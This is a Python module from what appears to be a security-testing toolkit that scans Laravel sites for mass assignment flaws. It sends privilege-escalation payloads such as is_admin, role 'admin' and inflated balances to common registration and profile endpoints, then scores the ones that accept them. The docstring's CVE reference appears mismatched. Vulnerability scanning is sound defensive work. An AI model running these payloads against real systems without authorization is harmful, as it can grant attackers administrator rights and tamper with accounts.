"""
mass_assignment_checker.py

A security testing module for detecting Mass Assignment vulnerabilities in Laravel applications.
This tool is intended for authorized security testing only.

CVE-2021-21263
"""

import requests
import json
from typing import Dict, Optional, List, Tuple
from urllib.parse import urljoin
from collections import Counter
import sys

from modules.core import http_config
from modules.core.http_config import app_url

# ANSI color codes for terminal output
class Colors:
    CRITICAL = '\033[91m'    # Red
    WARNING = '\033[93m'     # Yellow
    SUCCESS = '\033[92m'     # Green
    INFO = '\033[94m'        # Blue
    BOLD = '\033[1m'
    RESET = '\033[0m'
    
    @staticmethod
    def disable():
        """Disable colors if terminal doesn't support them"""
        Colors.CRITICAL = ''
        Colors.WARNING = ''
        Colors.SUCCESS = ''
        Colors.INFO = ''
        Colors.BOLD = ''
        Colors.RESET = ''

# Check if colors are supported
if not sys.stdout.isatty():
    Colors.disable()

# Common Laravel endpoints that might be vulnerable
COMMON_ENDPOINTS = [
    '/register',
    '/api/register',
    '/api/user',
    '/api/users',
    '/api/profile',
    '/api/settings',
    '/api/account',
    '/users',
    '/user/update',
    '/profile/update',
    '/account/update',
    '/api/me',
    '/api/update-profile',
    '/api/user/update'
]

# Suspicious parameters with their risk scores (1-10)
SUSPICIOUS_PARAMS = {
    'is_admin': (True, 10),
    'admin': (True, 9),
    'role': ('admin', 9),
    'is_superuser': (True, 10),
    'superuser': (True, 9),
    'access_level': (999, 8),
    'permission': ('admin', 8),
    'user_type': ('admin', 8),
    'is_moderator': (True, 7),
    'is_staff': (True, 7),
    'privileges': (['admin', 'superuser'], 8),
    'role_id': (1, 7),
    'group': ('administrators', 8),
    'verified': (True, 5),
    'email_verified': (True, 5),
    'approved': (True, 6),
    'active': (True, 5),
    'premium': (True, 4),
    'subscription_level': ('premium', 4),
    'credits': (999999, 3),
    'balance': (999999, 3)
}

def calculate_vulnerability_score(payload: Dict) -> int:
    """
    Calculate vulnerability score based on the parameters in the payload.
    
    Args:
        payload: The payload dictionary
        
    Returns:
        Score from 1-10
    """
    max_score = 0
    for param in payload:
        if param in SUSPICIOUS_PARAMS:
            _, score = SUSPICIOUS_PARAMS[param]
            max_score = max(max_score, score)
    return max_score

def print_vulnerable_result(result: Dict):
    """Print a vulnerability result with color formatting"""
    score = result['vulnerability_score']
    
    # Determine severity level
    if score >= 8:
        severity = f"{Colors.CRITICAL}[CRITICAL]{Colors.RESET}"
    elif score >= 6:
        severity = f"{Colors.WARNING}[HIGH]{Colors.RESET}"
    elif score >= 4:
        severity = f"{Colors.WARNING}[MEDIUM]{Colors.RESET}"
    else:
        severity = f"{Colors.INFO}[LOW]{Colors.RESET}"
    
    print(f"\n{severity} Mass Assignment Possible on {Colors.BOLD}{result['endpoint']}{Colors.RESET} [{result['method']}]")
    
    # Print vulnerable parameters
    for param in result['payload']:
        if param in SUSPICIOUS_PARAMS:
            print(f"  {Colors.WARNING}Parameter:{Colors.RESET} {param}")
    
    print(f"  Response Code: {result['status_code']}")
    print(f"  Snippet: {result['response_snippet'][:100]}...")
    print(f"  {Colors.BOLD}Score: {score}/10{Colors.RESET}")

# HTTP status codes the module treats as a "live, accepting" endpoint. We only run the
# full payload matrix against endpoints that answer with one of these — anything else
# (404/405/401/403/5xx/redirect) means the endpoint isn't usefully reachable, so we skip
# it to avoid hammering the target with dozens of pointless requests (and log noise).
SUCCESS_STATUS = (200, 201, 204)


def check_endpoint(sess, base_url: str, endpoint: str, method: str = 'POST',
                   payload: Dict = None, timeout: int = 3) -> Tuple[Optional[Dict], Optional[int]]:
    """
    Test a single endpoint for mass assignment vulnerability.

    Args:
        sess: The requests Session used to issue all HTTP traffic
        base_url: The base URL of the target
        endpoint: The endpoint path to test
        method: HTTP method (POST or PUT)
        payload: The payload to send
        timeout: Request timeout in seconds

    Returns:
        Tuple of (vulnerability dict or None, HTTP status code or None).
        The status code is surfaced so the caller can gate further requests on
        a 2xx-success response; it is None when the request never completed
        (timeout / connection error).
    """
    url = app_url(base_url, endpoint)
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': http_config.BROWSER_USER_AGENT
    }

    try:
        if method == 'POST':
            response = sess.post(url, json=payload, headers=headers,
                                   timeout=timeout, allow_redirects=False)
        else:  # PUT
            response = sess.put(url, json=payload, headers=headers,
                                  timeout=timeout, allow_redirects=False)

        status_code = response.status_code

        # Check if authentication is required
        if status_code in [401, 403]:
            return None, status_code

        # Check for potential vulnerability indicators
        if status_code in SUCCESS_STATUS:
            # Try to parse response
            try:
                response_data = response.json()
                response_text = json.dumps(response_data)
            except:
                response_text = response.text[:200]
            
            # Check if any suspicious parameters appear in the response
            vulnerable_params = []
            for param, value in payload.items():
                if param in SUSPICIOUS_PARAMS and param in response_text:
                    vulnerable_params.append(param)
            
            # If we found vulnerable params or got a success response with suspicious payload
            if vulnerable_params or (status_code in [200, 201] and
                                   any(p in SUSPICIOUS_PARAMS for p in payload)):
                return {
                    'url': url,
                    'endpoint': endpoint,
                    'method': method,
                    'payload': payload,
                    'status_code': status_code,
                    'response_snippet': response_text[:200],
                    'vulnerability_score': calculate_vulnerability_score(payload),
                    'vulnerable_params': vulnerable_params
                }, status_code

        # Reachable, but not a success status and not a vuln indicator.
        return None, status_code

    except requests.exceptions.Timeout:
        pass
    except requests.exceptions.ConnectionError:
        pass
    except Exception:
        pass

    return None, None

def scan(target_url: str, *, session=None, username=None, password=None, **kwargs) -> List[Dict]:
    """
    Scan a Laravel application for mass assignment vulnerabilities.

    Args:
        target_url: The base URL of the target application

    Returns:
        List of dictionaries with vulnerability details, empty list if none found
    """
    sess = session or http_config.get_auth_session()

    # Normalize target URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    target_url = target_url.rstrip('/')
    
    print(f"{Colors.INFO}Starting mass assignment vulnerability scan on {Colors.BOLD}{target_url}{Colors.RESET}")
    print(f"{Colors.INFO}Testing {len(COMMON_ENDPOINTS)} endpoints...{Colors.RESET}\n")
    
    vulnerabilities = []
    endpoints_tested = 0
    endpoints_skipped = 0
    all_vulnerable_params = []

    # Create test payloads with different combinations
    test_payloads = [
        {'is_admin': True, 'email': 'test@example.com', 'password': 'password123'},
        {'role': 'admin', 'username': 'testuser', 'name': 'Test User'},
        {'access_level': 999, 'is_superuser': True},
        {'user_type': 'admin', 'permission': 'admin'},
        {'is_admin': True, 'role': 'admin', 'is_moderator': True},
        {param: value[0] for param, value in list(SUSPICIOUS_PARAMS.items())[:10]}  # Test subset
    ]

    # Test each endpoint with different payloads
    for endpoint in COMMON_ENDPOINTS:
        # Gate: probe the endpoint ONCE with the first payload. Only endpoints that
        # respond with a 2xx-success status get the full payload matrix. Anything else
        # (404/405/401/403/5xx/redirect/timeout) is skipped after a single request so we
        # don't fire ~12 pointless requests per dead endpoint and trip the target's logs.
        first_result, status = check_endpoint(sess, target_url, endpoint, 'POST', test_payloads[0])

        if status not in SUCCESS_STATUS:
            endpoints_skipped += 1
            reason = f"HTTP {status}" if status is not None else "no response"
            print(f"{Colors.INFO}↷{Colors.RESET} Skipped {endpoint} ({reason}) — not responding 200 OK"
                  + " " * 20, end='\r')
            continue

        endpoints_tested += 1
        print(f"{Colors.SUCCESS}✓{Colors.RESET} Tested {endpoint}" + " " * 30, end='\r')

        # The gate probe already used the first payload — record it if it was vulnerable.
        if first_result:
            vulnerabilities.append(first_result)
            all_vulnerable_params.extend(first_result.get('vulnerable_params', []))
            print_vulnerable_result(first_result)

        for idx, payload in enumerate(test_payloads):
            # Skip the first payload's POST: the gate probe above already sent it.
            if idx != 0:
                result, _ = check_endpoint(sess, target_url, endpoint, 'POST', payload)
                if result:
                    vulnerabilities.append(result)
                    all_vulnerable_params.extend(result.get('vulnerable_params', []))
                    print_vulnerable_result(result)

            # Test PUT method for update endpoints
            if any(keyword in endpoint for keyword in ['update', 'profile', 'settings', 'user']):
                result, _ = check_endpoint(sess, target_url, endpoint, 'PUT', payload)
                if result:
                    vulnerabilities.append(result)
                    all_vulnerable_params.extend(result.get('vulnerable_params', []))
                    print_vulnerable_result(result)

    # Clear the progress line
    print(" " * 80, end='\r')

    # Generate summary
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}Summary:{Colors.RESET}")
    print(f"  Endpoints responding (200 OK) and fully tested: {endpoints_tested}")
    print(f"  Endpoints skipped (not 200 OK): {endpoints_skipped}")
    print(f"  Vulnerable combinations: {len(vulnerabilities)}")
    
    if vulnerabilities:
        # Sort vulnerabilities by score
        vulnerabilities.sort(key=lambda x: x['vulnerability_score'], reverse=True)
        
        # Count vulnerable parameters
        param_counter = Counter(all_vulnerable_params)
        top_params = param_counter.most_common(3)
        
        if top_params:
            print(f"  Top risky params: {', '.join([p[0] for p in top_params])}")
        
        print(f"\n{Colors.CRITICAL}⚠  Mass assignment vulnerabilities detected!{Colors.RESET}")
        print(f"{Colors.WARNING}Please review and patch these endpoints immediately.{Colors.RESET}")
    else:
        print(f"\n{Colors.SUCCESS}✓ No mass assignment vulnerabilities detected.{Colors.RESET}")
    
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\n")
    
    return vulnerabilities

# Example usage
if __name__ == "__main__":
    # Example: results = scan("https://example.com")
    # This will print colored output and return all vulnerabilities found
    pass